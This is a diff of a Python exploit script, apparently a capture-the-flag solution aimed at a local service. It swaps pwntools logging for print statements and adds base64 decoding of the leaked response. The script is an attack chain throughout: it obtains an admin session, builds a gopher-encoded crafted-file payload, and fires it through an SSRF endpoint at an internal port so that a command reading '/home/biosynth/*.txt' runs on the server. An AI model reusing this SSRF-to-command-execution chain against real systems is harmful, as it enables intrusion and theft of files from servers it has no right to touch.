@@ -1,16 +1,13 @@
 #!/usr/bin/env python3
+import base64
 import hashlib
 import struct
 import urllib.parse
 
 import requests
-from pwn import *
 
 BASE_URL = "http://localhost:8000"
 COMMAND  = "cat /home/biosynth/*.txt"
-
-context.arch = "amd64"
-context.os   = "linux"
 
 MAGIC = b"BSF\x01"
 
@@ -57,18 +54,19 @@ def ssrf(session: requests.Session, url: str) -> str:
     if start == -1:
         return ""
     start += len(marker_open)
-    return resp.text[start:resp.text.find(marker_close, start)]
+    encoded = resp.text[start:resp.text.find(marker_close, start)]
+    return base64.b64decode(encoded, validate=True).decode("utf-8")
 
 
 if __name__ == "__main__":
     bsf = make_exploit_bsf()
 
     admin = get_admin_session()
-    log.info("[+] Admin session obtained")
+    print("[+] Admin session obtained")
 
     url = gopher_encode("127.0.0.1", 1337, bsf)
-    log.info(f"[+] Sending gopher payload ({len(bsf)} bytes)")
+    print(f"[+] Sending gopher payload ({len(bsf)} bytes)")
     out = ssrf(admin, url)
-    log.info(f"[+] Response: {out}")
+    print(f"[+] Response: {out}")
 
 
